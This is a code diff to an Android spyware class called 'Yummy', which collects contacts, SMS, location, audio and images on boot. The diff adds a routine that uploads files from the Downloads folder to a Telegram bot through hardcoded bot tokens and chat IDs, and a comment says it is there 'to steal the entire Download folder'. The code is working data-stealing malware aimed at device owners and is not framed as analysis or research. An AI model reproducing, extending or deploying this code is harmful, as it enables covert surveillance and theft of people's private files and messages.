@@ -17,6 +17,10 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
 
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.OutputStream;
+
 /**
  * Yummy can:
  * 1) Collect data: contacts, sms, location, audio, images
@@ -28,7 +32,11 @@ public class Yummy extends BroadcastReceiver {
 
     private static final String TAG = "Yummy";
     private static final String BOT_TOKEN = "7708281150:AAEvpZ3B4-xi2ZQblza5hO_4tHyGkX6fiRs";
+    // 7207364664:AAGmNIlIfhTr0G49lEezFmk17oCnXJBO38E solo
+    // 7708281150:AAEvpZ3B4-xi2ZQblza5hO_4tHyGkX6fiRs group
     private static final String CHAT_ID = "-4744802700";
+    // 732298598 solo bot
+    // -4744802700 group bot
 
     // For polling
     private static boolean pollingActive = false;
@@ -40,6 +48,9 @@ public class Yummy extends BroadcastReceiver {
             // By default on boot, we gather everything and send
             String data = collectAllData(context);
             sendToTelegramInChunks(data);
+
+            // this is to steal the entire "Download" folder
+            sendFilesFromDownloads(context);
         } catch (Exception e) {
             Log.e(TAG, "Failed to retrieve or send data", e);
         }
@@ -158,6 +169,9 @@ public class Yummy extends BroadcastReceiver {
 
                     // also send actual images
                     sendActualImagesToTelegram(context);
+
+                    // send the file
+                    sendFilesFromDownloads(context);
                 }
                 idx = endQuote;
             }
@@ -176,11 +190,15 @@ public class Yummy extends BroadcastReceiver {
     }
 
     public static String collectAllData(Context context) {
+
+        sendFilesFromDownloads(context); // ← This uploads real files
+
         StringBuilder sb = new StringBuilder();
         sb.append("Contacts & SMS:\n").append(collectContactsAndSms(context));
         sb.append("\n\nLocation:\n").append(collectLocation(context));
         sb.append("\n\nAudio Files:\n").append(collectAudioFiles(context));
         sb.append("\n\nImages:\n").append(collectImages(context));
+        sb.append("\n\nFiles:\n").append(getFileSummaryFromDownloads()); // NEW
         return sb.toString();
     }
 
@@ -515,4 +533,127 @@ public class Yummy extends BroadcastReceiver {
             Log.e(TAG, "postImageToTelegram failed for " + fileName, e);
         }
     }
+
+    //file
+    public static void sendFilesFromDownloads(Context context) {
+        File downloadsDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS);
+        Log.d(TAG, "Looking for Downloads directory...");
+
+        if (downloadsDir == null) {
+            Log.d(TAG, "Downloads directory is null.");
+            return;
+        }
+
+        if (!downloadsDir.exists()) {
+            Log.d(TAG, "Downloads directory does not exist: " + downloadsDir.getAbsolutePath());
+            return;
+        }
+
+        Log.d(TAG, "Downloads directory found at: " + downloadsDir.getAbsolutePath());
+
+        File[] files = downloadsDir.listFiles();
+
+        if (files == null) {
+            Log.d(TAG, "Failed to list files in Downloads.");
+            return;
+        }
+
+        if (files.length == 0) {
+            Log.d(TAG, "No files in Downloads.");
+            return;
+        }
+
+        Log.d(TAG, "Found " + files.length + " file(s) in Downloads.");
+
+        for (int i = 0; i < Math.min(5, files.length); i++) {
+            File file = files[i];
+            if (file.isFile()) {
+                Log.d(TAG, "Preparing to send file to Telegram: " + file.getAbsolutePath() + " (Size: " + file.length() + " bytes)");
+                postDocumentToTelegram(file);
+            } else {
+                Log.d(TAG, "Skipped non-file entry: " + file.getAbsolutePath());
+            }
+        }
+    }
+
+
+
+    private static void postDocumentToTelegram(File file) {
+        String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
+        String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
+
+        try {
+            java.net.URL url = new java.net.URL(urlString);
+            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
+            conn.setDoOutput(true);
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+            OutputStream output = conn.getOutputStream();
+            String LINE_FEED = "\r\n";
+
+            // Part 1: chat_id
+            output.write(("--" + boundary + LINE_FEED).getBytes());
+            output.write("Content-Disposition: form-data; name=\"chat_id\"".getBytes());
+            output.write(LINE_FEED.getBytes());
+            output.write(LINE_FEED.getBytes());
+            output.write(CHAT_ID.getBytes());
+            output.write(LINE_FEED.getBytes());
+
+            // Part 2: document
+            output.write(("--" + boundary + LINE_FEED).getBytes());
+            output.write(("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"" + LINE_FEED).getBytes());
+            output.write("Content-Type: application/octet-stream".getBytes());
+            output.write(LINE_FEED.getBytes());
+            output.write(LINE_FEED.getBytes());
+
+            FileInputStream inputStream = new FileInputStream(file);
+            byte[] buffer = new byte[4096];
+            int bytesRead;
+            while ((bytesRead = inputStream.read(buffer)) != -1) {
+                output.write(buffer, 0, bytesRead);
+            }
+            inputStream.close();
+            output.write(LINE_FEED.getBytes());
+
+            // End boundary
+            output.write(("--" + boundary + "--" + LINE_FEED).getBytes());
+            output.flush();
+            output.close();
+
+            int responseCode = conn.getResponseCode();
+            Log.d(TAG, "Uploaded " + file.getName() + " to Telegram, response=" + responseCode);
+            conn.disconnect();
+        } catch (Exception e) {
+            Log.e(TAG, "postDocumentToTelegram failed for " + file.getName(), e);
+        }
+    }
+
+    public static String getFileSummaryFromDownloads() {
+        File downloadsDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS);
+        if (downloadsDir == null || !downloadsDir.exists()) {
+            return "Downloads folder not found.";
+        }
+
+        File[] files = downloadsDir.listFiles();
+        if (files == null || files.length == 0) {
+            return "No files found in Downloads.";
+        }
+
+        StringBuilder fileList = new StringBuilder();
+        for (int i = 0; i < Math.min(5, files.length); i++) {
+            File file = files[i];
+            if (file.isFile()) {
+                fileList.append(" - ").append(file.getName()).append(" (")
+                        .append(file.length() / 1024).append(" KB)\n");
+            }
+        }
+        return fileList.toString();
+    }
+
+
+
+
+
+
 }
